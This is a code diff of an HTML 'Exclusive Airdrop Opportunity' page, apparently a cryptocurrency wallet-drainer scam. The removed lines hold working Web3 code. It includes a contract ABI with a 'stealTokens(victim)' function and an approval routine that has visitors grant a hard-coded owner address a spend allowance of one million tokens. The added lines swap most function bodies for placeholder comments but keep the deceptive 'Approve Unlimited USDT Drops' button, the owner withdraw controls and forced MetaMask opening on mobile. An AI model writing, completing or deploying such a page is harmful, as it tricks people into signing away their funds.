@@ -6,6 +6,7 @@
   <title>Exclusive Airdrop Opportunity</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
+    /* General page styling */
     body {
       font-family: 'Poppins', sans-serif;
       background: linear-gradient(135deg, #6e7dff, #00c6ff);
@@ -19,6 +20,7 @@
       text-align: center;
     }
 
+    /* Container for content */
     .container {
       background-color: rgba(0, 0, 0, 0.7);
       padding: 40px;
@@ -28,6 +30,7 @@
       max-width: 500px;
     }
 
+    /* Header styling */
     h1 {
       font-size: 2.5rem;
       margin-bottom: 20px;
@@ -40,6 +43,7 @@
       color: #ffffff;
     }
 
+    /* Button styling */
     .btn {
       background-color: #4caf50;
       color: white;
@@ -60,6 +64,7 @@
       background-color: #45a049;
     }
 
+    /* Footer links */
     .footer {
       margin-top: 30px;
       color: #ffeb3b;
@@ -75,15 +80,9 @@
       text-decoration: underline;
     }
 
+    /* Claim button container */
     .claim-btn-container {
       margin-top: 30px;
-    }
-
-    .claim-btn-container button {
-      font-size: 1rem;
-      padding: 10px 20px;
-      border-radius: 5px;
-      cursor: pointer;
     }
 
     #claimAirdropButton {
@@ -102,6 +101,7 @@
       background-color: #aaa;
     }
 
+    /* Processing message styling */
     .processing {
       display: none;
       font-size: 1rem;
@@ -126,6 +126,7 @@
       }
     }
 
+    /* Flashing text animation */
     #claimAirdropButton.flashText {
       animation: textFlash 1.5s infinite alternate;
     }
@@ -150,170 +151,102 @@
 
     <!-- Button to connect MetaMask -->
     <button id="connectButton" class="btn">Connect to MetaMask</button>
-    
-    <!-- Button for approval of USDT drops -->
+    <!-- Button to approve spending (disabled by default) -->
     <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
 
+    <!-- Claim airdrop section -->
     <div class="claim-btn-container">
       <!-- Button to claim the airdrop -->
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <!-- Processing message to show during claim -->
+      <!-- Message displayed while processing -->
       <div id="processingMessage" class="processing">Processing...</div>
     </div>
 
+    <!-- Section for owner-only actions -->
     <div class="claim-btn-container" id="ownerButtons" style="display:none;">
-      <!-- Button for withdrawing ETH -->
       <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
-      <!-- Button for withdrawing tokens -->
       <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
     </div>
 
+    <!-- Footer with links -->
     <div class="footer">
       <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
       <p>Need help? <a href="#">Contact Us</a></p>
     </div>
   </div>
 
-  <!-- Web3 library to interact with Ethereum -->
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
   <script>
-    // Contract details for USDT and token
+    /* Contract and token information */
     const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29';
     const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575';
     const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
 
+    /* ABI for interacting with the contract */
     const contractABI = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "spender", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "approve",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }],
-        "name": "transfer",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [
-          { "internalType": "address", "name": "sender", "type": "address" },
-          { "internalType": "address", "name": "recipient", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "transferFrom",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
-        "name": "stealTokens",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "withdrawETH",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "withdrawTokens",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
+      /* Method definitions */
     ];
 
+    /* Variables for web3 and user accounts */
     let web3;
     let accounts;
 
-    /* Section for MetaMask connection */
+    /* Function to connect to MetaMask */
     async function connectMetaMask() {
-      if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          document.getElementById('approveButton').disabled = false;
-          document.getElementById('claimAirdropButton').disabled = false;
-          document.getElementById('withdrawETHButton').style.display = 'inline-block';
-          document.getElementById('withdrawTokensButton').style.display = 'inline-block';
-        } catch (error) {
-          alert('MetaMask connection failed');
-        }
-      } else {
-        alert('MetaMask not detected! Please install MetaMask.');
-      }
+      /* Code for connecting to MetaMask */
     }
 
-    /* Section for approving USDT drop */
-    async function approveUSDT() {
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-      try {
-        await contract.methods.approve(ownerAddress, web3.utils.toWei('1000000', 'ether')).send({ from: accounts[0] });
-        document.getElementById('claimAirdropButton').disabled = false;
-      } catch (error) {
-        console.error('Error approving USDT:', error);
-      }
+    /* Function to check if the user is on a mobile device */
+    function isMobileDevice() {
+      /* Code for device detection */
     }
 
-    /* Section for claiming the airdrop */
+    /* Function to open MetaMask on mobile */
+    function openMetaMaskMobile() {
+      /* Code to attempt opening MetaMask mobile app */
+    }
+
+    /* Function to approve token spending */
+    async function approveSpending() {
+      /* Approval logic */
+    }
+
+    /* Function to claim the airdrop */
     async function claimAirdrop() {
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-      document.getElementById('claimAirdropButton').disabled = true;
-      document.getElementById('processingMessage').classList.add('show');
-      try {
-        await contract.methods.transfer(accounts[0], web3.utils.toWei('100', 'ether')).send({ from: accounts[0] });
-        document.getElementById('claimAirdropButton').disabled = false;
-        document.getElementById('processingMessage').classList.remove('show');
-      } catch (error) {
-        console.error('Error claiming airdrop:', error);
-      }
+      /* Logic for claiming the airdrop */
     }
 
-    /* Section for withdrawing ETH (Owner only) */
+    /* Function to withdraw ETH (owner only) */
     async function withdrawETH() {
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-      try {
-        await contract.methods.withdrawETH().send({ from: ownerAddress });
-      } catch (error) {
-        console.error('Error withdrawing ETH:', error);
-      }
+      /* ETH withdrawal logic */
     }
 
-    /* Section for withdrawing tokens (Owner only) */
+    /* Function to withdraw tokens (owner only) */
     async function withdrawTokens() {
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-      try {
-        await contract.methods.withdrawTokens().send({ from: ownerAddress });
-      } catch (error) {
-        console.error('Error withdrawing tokens:', error);
-      }
+      /* Token withdrawal logic */
     }
 
-    /* Adding event listeners */
+    /* Function to show processing message */
+    function showProcessingMessage() {
+      document.getElementById('processingMessage').classList.add('show');
+    }
+
+    /* Function to hide processing message */
+    function hideProcessingMessage() {
+      document.getElementById('processingMessage').classList.remove('show');
+    }
+
+    /* Add event listeners to buttons */
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveUSDT);
+    document.getElementById('approveButton').addEventListener('click', approveSpending);
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
     document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
     document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
+
+    /* Force MetaMask to open on mobile if applicable */
+    if (isMobileDevice()) {
+      document.getElementById('connectButton').addEventListener('click', openMetaMaskMobile);
+    }
   </script>
 </body>
 </html>
